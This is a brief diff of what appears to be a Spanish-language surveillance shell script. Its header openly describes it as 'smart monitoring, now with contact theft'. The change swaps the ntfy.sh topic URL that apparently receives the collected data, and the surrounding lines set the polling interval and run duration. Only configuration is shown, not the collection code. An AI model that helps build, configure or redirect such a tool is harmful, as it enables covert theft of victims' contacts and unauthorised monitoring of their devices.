@@ -2,7 +2,7 @@
 # Monitoreo Inteligente Mejorado (Ahora con Robo de Contactos)
 
 # ===== CONFIGURACIÓN =====
-NTFY_URL="https://ntfy.sh/rotape009"
+NTFY_URL="https://ntfy.sh/pe9278301"
 INTERVALO=5  #tiempo entre actualizaciones
 DURACION_MIN=60 # Duración total en minutos
 DEBUG=true
